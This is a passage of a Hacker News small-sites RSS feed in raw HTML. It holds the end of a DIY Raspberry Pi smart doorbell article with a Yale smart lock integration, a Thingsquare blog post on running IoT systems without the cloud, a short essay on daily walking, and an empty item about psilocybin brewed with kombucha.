https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-540x304.jpg.webp 540w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-344x194.jpg.webp 344w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1128x635.jpg.webp 1128w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover.jpg.webp 1920w"><img width="736" height="414" src="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg" alt="" srcset="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-300x169.jpg 300w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-768x432.jpg 768w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-540x304.jpg 540w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-344x194.jpg 344w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover.jpg 1920w" sizes="(max-width: 736px) 100vw, 736px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x576.png" data-srcset="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-300x169.jpg 300w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-768x432.jpg 768w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-540x304.jpg 540w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-344x194.jpg 344w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover.jpg 1920w"></picture></a></div><div><div><div><a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" title="Related: CCTV Security Cameras" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 300px) 100vw, 300px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png.webp 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png.webp 482w"><img width="300" height="103" src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" alt="" srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w" sizes="(max-width: 300px) 100vw, 300px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-300x103.png" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w"></picture></a></div><div><p>Protect a home with DIY CCTV security cameras. Includes motion detection, automatic recording, recognition of people/cars, alerts, and more.</p></div></div></div></article><p>With the coding done, it was time to put all the parts together…</p><h2><span id="Smart_Lock_Integration"></span>Smart Lock Integration<span></span></h2><p>With the basics covered, it was time to assemble and mount everything:</p><figure><a href="https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527.jpg" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 698px) 100vw, 698px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-931x1024.jpg.webp 931w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-273x300.jpg.webp 273w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-768x845.jpg.webp 768w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-1397x1536.jpg.webp 1397w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527.jpg.webp 1862w"><img src="https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-931x1024.jpg" alt="steampunk themed raspberry pi doorbell assembled" width="698" height="768" title="Smart doorbell assembled" srcset="https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-931x1024.jpg 931w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-273x300.jpg 273w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-768x845.jpg 768w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-1397x1536.jpg 1397w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527.jpg 1862w" sizes="(max-width: 698px) 100vw, 698px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-931x1024.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-931x1024.png" data-srcset="https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-931x1024.jpg 931w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-273x300.jpg 273w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-768x845.jpg 768w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527-1397x1536.jpg 1397w, https://content.technicallywizardry.com/2020/05/17142931/copper-case-scaled-e1591796245527.jpg 1862w"></picture></a><figcaption>Adding some random copper and brass parts to create a steampunk theme.</figcaption></figure><p>I used hot glue on the openings of the junction box to seal it, where possible. The copper ring seen above also has a lip, protecting the camera from water. Plus, the whole thing is installed underneath a balcony, so not much water even has the chance to hit the doorbell.</p><p>The final pieces was to integrate the doorbell with a smart lock. Thankfully, Home Assistant makes this easy. We have this Yale Assure lock:</p><p>It communicates with Home Assistant via Z-Wave. What I like about this lock is that it can be programmed remotely to support different user codes (useful as an Airbnb host, or when you need to let a friend in). It also can detect which user pin code was used to open the door (and when) — great peace of mind when giving cleaners a code to the house.</p><figure><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 947px) 100vw, 947px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png.webp 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png.webp 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png.webp 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png.webp 768w"><img src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" alt="home assistant motioneye camera" width="947" height="717" title="Home Assistant " srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w" sizes="(max-width: 947px) 100vw, 947px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-947x717.png" data-srcset="https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM.png 1262w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-300x227.png 300w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-1024x776.png 1024w, https://content.technicallywizardry.com/2020/05/17160019/Screen-Shot-2020-05-17-at-9.59.28-AM-768x582.png 768w"></picture><figcaption>Home Assistant connects to MotionEye to show the camera, motion alerts, and other detections.</figcaption></figure><p>But, most importantly, it can be locked/unlocked with a tap in Home Assistant.</p><h2><span id="Source_Code_Recap"></span>Source Code: Recap<span></span></h2><p>I wish I could give you copy-and-paste code for this project, but a lot of it will depend on your exact hardware, speakers, cameras, etc. Instead, I’ll recap each piece involved and link to the articles/code where I explain how to implement them:</p><ul><li><a href="https://www.technicallywizardry.com/node-red-docker-kubernetes/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Node Red uses gpiod</a> to trigger a flow when GPIO #18 (the doorbell button) fires.</li><li>The <a href="https://www.technicallywizardry.com/loudspeaker-network-intercoms-alerts/" data-wpel-link="internal" rel="internal follow noopener noreferrer">loudspeaker alert flow plays a wav file</a>.</li><li>I have <a href="https://www.technicallywizardry.com/speaker-multi-room-wireless-receiver/" data-wpel-link="internal" rel="internal follow noopener noreferrer">multiple DIY speakers</a> that play the alert around the house.</li><li><a href="https://www.technicallywizardry.com/diy-dashcam-raspberry-pi-zero-w-motion-eye/" data-wpel-link="internal" rel="internal follow noopener noreferrer">MotionEye drives the camera</a>, capturing stills and videos.</li><li>The <a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" data-wpel-link="internal" rel="internal follow noopener noreferrer">CCTV Security Cameras</a> handle person/object detection.</li><li><a href="https://www.technicallywizardry.com/tag/home-assistant/" data-wpel-link="internal" rel="internal follow noopener noreferrer">Home Assistant’s</a> Yale Lock integration allows us to lock/unlock. The Yale lock is a <a href="https://www.home-assistant.io/integrations/zwave/" target="_blank" rel="noopener nofollow external noreferrer" data-wpel-link="external">Z-Wave</a> device. Once paired with Home Assistant, it shows up as a lock and requires no further configuration.</li></ul><article><div><a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" title="Related: CCTV Security Cameras" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 736px) 100vw, 736px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg.webp 1024w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-300x169.jpg.webp 300w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-768x432.jpg.webp 768w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1536x864.jpg.webp 1536w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-540x304.jpg.webp 540w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-344x194.jpg.webp 344w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1128x635.jpg.webp 1128w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover.jpg.webp 1920w"><img width="736" height="414" src="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg" alt="" srcset="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-300x169.jpg 300w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-768x432.jpg 768w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-540x304.jpg 540w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-344x194.jpg 344w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover.jpg 1920w" sizes="(max-width: 736px) 100vw, 736px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-1024x576.png" data-srcset="https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1024x576.jpg 1024w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-300x169.jpg 300w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-768x432.jpg 768w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1536x864.jpg 1536w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-540x304.jpg 540w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-344x194.jpg 344w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover-1128x635.jpg 1128w, https://content.technicallywizardry.com/2020/07/04145741/cctv-cover.jpg 1920w"></picture></a></div><div><div><div><a href="https://www.technicallywizardry.com/iot/cctv-security-cameras/" title="Related: CCTV Security Cameras" data-wpel-link="internal" rel="internal follow noopener noreferrer"><picture><source srcset="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" sizes="(max-width: 300px) 100vw, 300px" type="image/webp" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png.webp 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png.webp 482w"><img width="300" height="103" src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" alt="" srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w" sizes="(max-width: 300px) 100vw, 300px" data-eio="l" data-src="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png" data-old-src="https://assets.technicallywizardry.com/wp-content/ewww/lazy/placeholder-300x103.png" data-srcset="https://content.technicallywizardry.com/2020/01/22001321/pipes-cta-300x103.png 300w, https://content.technicallywizardry.com/2020/01/22001321/pipes-cta.png 482w"></picture></a></div><div><p>Protect a home with DIY CCTV security cameras. Includes motion detection, automatic recording, recognition of people/cars, alerts, and more.</p></div></div></div></article></div></article></div>]]>
            </description>
            <link>https://www.technicallywizardry.com/diy-smart-doorbell-raspberry-pi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25225934</guid>
            <pubDate>Fri, 27 Nov 2020 06:13:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cloudless IoT: The Internet of Things, Without the Cloud]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25225852">thread link</a>) | @tdrnd
<br/>
November 26, 2020 | https://www.thingsquare.com/blog/articles/iot-without-the-cloud/ | <a href="https://web.archive.org/web/*/https://www.thingsquare.com/blog/articles/iot-without-the-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Whether you like it or not, the cloud has become an integral part of the Internet of Things. But sometimes it is not practical, or desirable, to rely on an external cloud service to operate your IoT system. Regardless if your devices are <a href="https://www.thingsquare.com/blog/articles/sensortag-power/">tiny wireless sensors</a> or <a href="https://www.thingsquare.com/blog/articles/smart-wireless-led-street-lighting/">street lights</a>.</p>
<p>With our <a href="https://www.thingsquare.com/blog/articles/release-4.3.0/" target="_blank">latest release</a> of the <a href="https://www.thingsquare.com/iot-platform/">Thingsquare IoT platform</a>, we are adding the ability to run the Thingsquare IoT platform off the grid – away from the&nbsp;cloud.</p>
<div>
<blockquote data-partner="tweetdeck"><p lang="en" dir="ltr">Thingsquare’s industrial IoT lighting solution, away from the cloud <a href="https://t.co/HmQLAbrAK5">https://t.co/HmQLAbrAK5</a> <a href="https://twitter.com/hashtag/IoT?src=hash&amp;ref_src=twsrc%5Etfw">#IoT</a> <a href="https://twitter.com/hashtag/cloudless?src=hash&amp;ref_src=twsrc%5Etfw">#cloudless</a> <a href="https://twitter.com/hashtag/nocloud?src=hash&amp;ref_src=twsrc%5Etfw">#nocloud</a> <a href="https://t.co/XI5XACK10K">pic.twitter.com/<span>XI5XACK10K</span></a></p>— Thingsquare (@thingsqr) <a href="https://twitter.com/thingsqr/status/1198657074927931392?ref_src=twsrc%5Etfw">November 24, 2019</a></blockquote>

</div>

<p>We are not alone in believing in the idea of a cloudless IoT. In the IoT community, the concept is often called <a href="https://en.wikipedia.org/wiki/Edge_computing" target="_blank">edge</a> or <a href="https://en.wikipedia.org/wiki/Fog_computing" target="_blank">fog</a> computing. There are entire software platforms, such as the <a href="https://litmusautomation.com/en/loopedge/" target="_blank">Litmus LoopEdge platform</a>, <a href="https://azure.microsoft.com/en-us/services/iot-edge/" target="_blank">Microsoft Azure Edge</a>, and the <a href="https://crosser.io/solutions/iot-edge-analytics/" target="_blank">Crosser IoT edge analytics suite</a>, that are built to run off the grid. There are even custom <a href="https://cloud.google.com/edge-tpu/" target="_blank">hardware chips</a> designed to support off-the-cloud computation, usually speech&nbsp;processing.</p>
<p>There also an old adage that <i>the Internet of things without the Internet is just … things</i>. This is not true: there are many situations where IoT systems without Internet can be as valuable as Internet-enabled IoT&nbsp;systems.</p>
<p>We at Thingsquare have built and deployed several cloudless IoT systems with the no-cloud version of our IoT platform,&nbsp;including:</p>
<ul>
<li><strong>Electrical generators</strong>. These are deployed in a remote location where there is little or no Internet&nbsp;access.</li>
<li><strong>Industrial machinery</strong>. These are deployed as a completely standalone product with a separate touch screen on the local&nbsp;controller.</li>
<li><strong>Industrial lighting</strong>. These are run in places where customers want a completely siloed&nbsp;system.</li>
</ul>
<blockquote>
<p>
<small>For more background on how IoT platforms work, see <a href="https://www.thingsquare.com/blog/articles/why-iot-platform/" target="_blank">our article on why you should use an IoT platform</a> and the page about the <a href="https://www.thingsquare.com/iot-platform/" target="_blank">Thingsquare IoT platform</a>.</small>
</p>
</blockquote>

<p>But let’s first look at why we use the cloud at all. Because there are good reasons for doing&nbsp;so.</p>
<div>
<div>
<div data-src="adele-payman-2oYMwuFgnTg-unsplash.jpg">
<div>
<div>
<div>
<div>
<figure>
<svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 8 8" style="enable-background:new 0 0 8 8;" space="preserve">
<path d="M3,1.3C2,1.7,1.2,2.7,1.2,3.6c0,0.2,0,0.4,0.1,0.5c0.2-0.2,0.5-0.3,0.9-0.3c0.8,0,1.5,0.6,1.5,1.5c0,0.9-0.7,1.5-1.5,1.5
C1.4,6.9,1,6.6,0.7,6.1C0.4,5.6,0.3,4.9,0.3,4.5c0-1.6,0.8-2.9,2.5-3.7L3,1.3z M7.1,1.3c-1,0.4-1.8,1.4-1.8,2.3
c0,0.2,0,0.4,0.1,0.5c0.2-0.2,0.5-0.3,0.9-0.3c0.8,0,1.5,0.6,1.5,1.5c0,0.9-0.7,1.5-1.5,1.5c-0.7,0-1.1-0.3-1.4-0.8
C4.4,5.6,4.4,4.9,4.4,4.5c0-1.6,0.8-2.9,2.5-3.7L7.1,1.3z"></path>
</svg>
</figure>
<blockquote>
Sometimes it is not practical, or desirable, to rely on an external cloud service to operate your IoT system
</blockquote>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<h2 id="why-iot-in-the-cloud-">Why IoT in the&nbsp;cloud?</h2>
<p>There are good reasons for why the backend logic of an IoT system is run in the&nbsp;cloud:</p>
<ul>
<li><strong>Data storage</strong>: The cloud can store an almost unlimited amount of&nbsp;data.</li>
<li><strong>Computation</strong>: Some mechanisms needs an abundance of computational power, which is something that the cloud can provide an almost unlimited amount&nbsp;of.</li>
<li><strong>Remote access</strong>: To provide users with remote access to the data generated by the IoT devices, or to control the devices themselves, you need to have a cloud service that connects the devices with their&nbsp;users.</li>
<li><strong>Access control</strong>: The cloud can provide effective access control mechanisms for your&nbsp;users.</li>
<li><strong>Data cross-referencing</strong>: To be able to run effective machine learning algorithms, you sometimes need access to a wide range of data. The cloud lets you collect data from more than one site to cross-reference and combine this&nbsp;data.</li>
<li><strong>Application integration</strong>: IoT systems rarely run on their own. Integration with other software systems is much easier if the backend is located in a single place: the&nbsp;cloud.</li>
<li><strong>Security updates</strong>: when the IoT backend is run in the cloud, a dedicated security team can keep track of and apply security updates as&nbsp;needed.</li>
</ul>
<p>These reasons, which are good reasons, are why most IoT systems today are provided through the cloud. Thingsquare is no&nbsp;exception.</p>
<p>The backend portion of the <a href="https://www.thingsquare.com/iot-platform/">Thingsquare IoT platform</a> is originally designed to be run in the cloud. Sometimes the backend is running on a typical cloud provider like Amazon Web Services, and sometimes the backend is installed on a hosted machine, as a traditional on-premise software&nbsp;package.</p>
<p>But the running the IoT backend in cloud does come with some&nbsp;drawbacks.</p>
<h2 id="why-cloudless-iot-">Why cloudless&nbsp;IoT?</h2>
<p>There are good reasons to not rely on an always-on cloud connection for every IoT&nbsp;project:</p>
<ul>
<li><strong>Stability</strong>: cloud services may go down so avoiding the cloud may therefore increase&nbsp;stability.</li>
<li><strong>Persistence</strong>: cloud services may go away so avoiding the cloud may allow the IoT system to run for ever, without relying on the hosting company to&nbsp;persist.</li>
<li><strong>Data privacy</strong>: sometimes data should not leave the location where it is&nbsp;generated.</li>
<li><strong>Security</strong>: fewer network connections means fewer attack&nbsp;vectors.</li>
<li><strong>Necessity</strong>: sometimes there just isn’t Internet&nbsp;access.</li>
</ul>
<p>Any cloud-based software may become unreachable if the cloud goes down. This can happen even for <a href="https://www.cbronline.com/news/google-cloud-down" target="_blank">companies like Google</a>, who arguably has state-of-the-art cloud infrastructures and one of the best cloud teams in the world. Any IoT solution that wholly depends on the cloud will suffer an outage if the cloud goes&nbsp;down.</p>
<p>Because the cloud service is a living thing, it may die. This can happen if the company that runs the service goes away or if it simply decides that it is no longer economical to keep it running. There are several <a href="https://hackaday.com/2019/11/14/best-buys-iot-goes-dark-leaving-some-smart-products-dumbfounded/">real-world</a> <a href="https://www.theverge.com/2016/4/4/11362928/google-nest-revolv-shutdown-smart-home-products">examples</a> of&nbsp;this.</p>
<p>But the most compelling reason to why use a cloudless IoT system is when Internet access is unavailable. At Thingsquare, we have been working with projects where the IoT system is deployed in rural Africa, where Internet access is spotty at best. And with projects in countries Internet access has been generally available, but where the IoT system has been inside a deep cellar where 4G access was&nbsp;impossible.</p>
<h2 id="the-challenges-of-cloudless-iot">The challenges of cloudless&nbsp;IoT</h2>
<p>Moving the IoT backend away from the cloud, closer to the IoT devices presents a number of&nbsp;challenges:</p>
<ul>
<li><strong>Authentication</strong>: authentication is significantly easier with the cloud, thanks to mechanisms such as 2 factor&nbsp;authentication.</li>
<li><strong>Remote access</strong>: providing remote access without the cloud is very difficult and in most cases&nbsp;impossible.</li>
<li><strong>Data processing</strong>: crunching numbers without having access to the abundance of storage and computation that the cloud provides is significantly&nbsp;harder.</li>
<li><strong>Software deployment</strong>: many IoT systems need data processing or similar mechanisms, and these systems are often designed to be run in the&nbsp;cloud.</li>
<li><strong>Software updates</strong>: software is a living thing and needs to be kept up to&nbsp;date.</li>
</ul>
<p>These issues result in trade-offs. Any IoT system that is deployed away from the cloud must be prepared to deal with&nbsp;them.</p>
<h2 id="a-practical-approach-to-a-cloudless-iot">A practical approach to a cloudless&nbsp;IoT</h2>
<p>Thingsquare takes a deliberately simple approach to the cloudless&nbsp;IoT:</p>
<ul>
<li>We run our IoT backend on a non-connected local&nbsp;controller</li>
<li>Deal with resulting the trade-offs on a case-by-case&nbsp;basis</li>
</ul>
<p>The local controller can run on a piece of hardware similar to a Raspberry Pi. The local controller is deployed on an on-site network and we provide a user interface over that network only. The user interface is accessible through a smartphone app, which can detect nearby local controllers via Bluetooth, and let users interact with&nbsp;devices.</p>
<p>The backend logic of the IoT application, which would normally run in the cloud, also runs on the local controller. This also means that the backend application must be scaled down to the limits of a Raspberry Pi-class&nbsp;device.</p>
<div>
<div>
<div>
<p>
The Thingsquare IoT platform, running in the cloud.
</p>
</div>

<div>
<p>
The Thingsquare IoT platform, running cloudless on a local controller.
</p>
</div>

</div>
</div>


<p>Since we cannot expect the local controller hardware to be as robust as a cloud host, particularly if the local controller is based on an <span>SD</span> drive, we limit disk writes by storing volatile data in memory. This means that software that runs on top of the API must be prepared to deal with having access to less&nbsp;data.</p>
<h3 id="user-authentication">User&nbsp;authentication</h3>
<p>To authenticate users, we use a two-tiered approach. The first tier is to leverage the existing access control to the local WiFi. If a user is authenticated to the local WiFi, this tier assumes that the user also should have access to the local controller and its devices. It is possible to configure the access level that such non-authenticated local users should&nbsp;have.</p>
<p>The second tier uses a hybrid approach: we use the cloud to authenticate the user and provide an access token to the local controller. The local controller announces its presence with encrypted Bluetooth beacons that the smartphone app uses to authenticate each user. This requires the users to have an account in the cloud. The app checks with the cloud server to match the encrypted beacon and the user account. If the user has access, the server responds with an access key to the local&nbsp;controller.</p>
<h3 id="device-authentication">Device&nbsp;authentication</h3>
<p>Device authentication is comparatively easier than user authentication, because devices can be preprogrammed with <span>TLS</span> certificates. We&nbsp;there</p>
<h3 id="software-delivery-with-a-git-repository">Software delivery with a git&nbsp;repository</h3>
<p>We deliver all software over a managed <a href="https://en.wikipedia.org/wiki/Git">git repository</a>. This repository can be updated by connecting the local controller to the Internet and requesting an update, or manually via a <span>USB</span>&nbsp;stick.</p>
<div>
<div>
<p>
For offline local controllers, software updates are provided via git repository, either distributed automatically via a temporary network connection or manually with a <span>USB</span> stick.
</p>
</div>
</div>

<h3 id="firmware-updates">Firmware&nbsp;updates</h3>
<p>Signed firmware update files are included in the git repository. Devices may request updates from the local controller, just as they do when they are connected to a cloud&nbsp;backend.</p>
<p>Because we use the full IoT backend software, <a href="https://www.thingsquare.com/blog/articles/network-updates">full-network <span>OTA</span> updates</a> work as&nbsp;usual.</p>
<h3 id="user-interface">User&nbsp;interface</h3>
<p>The local controller may present a user interface with a touch screen physically connected to the controller, or over the WiFi to smartphone apps on the same network. By default, the user interface is implemented via <span>HTML5</span>/JS/CSS and is updated via the git&nbsp;repository.</p>
<h2 id="conclusions">Conclusions</h2>
<p>The cloud is an integral part of the Internet of Things. But there are situations in which the cloud is not the best&nbsp;choice.</p>
<p>Thingsquare provides a local, cloudless IoT solution, based on the same software that is backing our cloud-based offering, that solves the problems with software delivery, user interface access, and firmware updates for the cloudless&nbsp;IoT.</p>

</section></div>]]>
            </description>
            <link>https://www.thingsquare.com/blog/articles/iot-without-the-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25225852</guid>
            <pubDate>Fri, 27 Nov 2020 05:54:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Walking Has Changed My Life]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25224829">thread link</a>) | @dbustac
<br/>
November 26, 2020 | https://danielbusta.com/walking/ | <a href="https://web.archive.org/web/*/https://danielbusta.com/walking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-175">

	
<!-- .entry-header -->

	<div>

		<div>

			
<figure><img src="https://images.unsplash.com/photo-1523359366921-4c14294ff5bd?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt=""><figcaption><em>Picture by <a href="https://unsplash.com/@ryoji__iwata" target="_blank" rel="noreferrer noopener">@ryoji__iwata</a></em></figcaption></figure>



<p>Every day I go for a 45-minute walk first thing in the morning. I’ve been doing it for almost two months now, I think. And it has become one of the most essential parts of my daily routine.</p>



<p>Walking awakens my mind and my body. It makes me feel energized, sharp and clear-headed. It helps me disentangle my thoughts, digest experiences and see unfamiliar patterns.&nbsp;</p>



<p>Maybe that’s why it’s so easy for me to write while I walk. Why it comes so naturally. I hate to admit it, but for some reason I struggle to write standing still. I need cadence. I need movement.</p>



<p>When I walk, my mind and my body move together. They ride and go along in unison, creating a feeling of immense tranquillity and equilibrium. Even when I’m witnessing dark or conflicting thoughts, it all flows smoothly.</p>



<p>I’ve always like walking. And I think I’ve also known for a while how much it helps me. Despite that, though, it was never a consistent habit. It was always occasional.</p>



<p>But now I seriously doubt I could go on with my life without doing it every day. I would go mad. Especially now that I call myself a creator.</p>



<p>Walking has become not just indispensable to my work and productivity, but also to my happiness and well-being — it is a form of self-care, even therapy.</p>


<p><em>This piece is part of a series of 30 atomic essays where I explore what it means to be a&nbsp;<a href="https://rationalcreatives.substack.com/" target="_blank" rel="noreferrer noopener">rational creative</a>&nbsp;and the different aspects of being a creator online. You can read all the others essays&nbsp;<a href="https://twitter.com/dbustac/status/1328419048070279174?s=20" target="_blank" rel="noreferrer noopener">here</a>.</em></p>
		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
		<!-- .comments-wrapper -->

		
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://danielbusta.com/walking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25224829</guid>
            <pubDate>Fri, 27 Nov 2020 01:26:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Psiloscoby: Psilocybin Brewed by Kombucha]]>
            </title>
            <description>
<![CDATA[
Score 216 | Comments 101 (<a href="https://news.ycombinator.com/item?id=25224721">thread link</a>) | @greyface-
<br/>
November 26, 2020 | https://invisible.college/project/psiloscoby | <a href="https://web.archive.org/web/*/https://invisible.college/project/psiloscoby">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://invisible.college/project/psiloscoby</link>
            <guid isPermaLink="false">hacker-news-small-sites-25224721</guid>
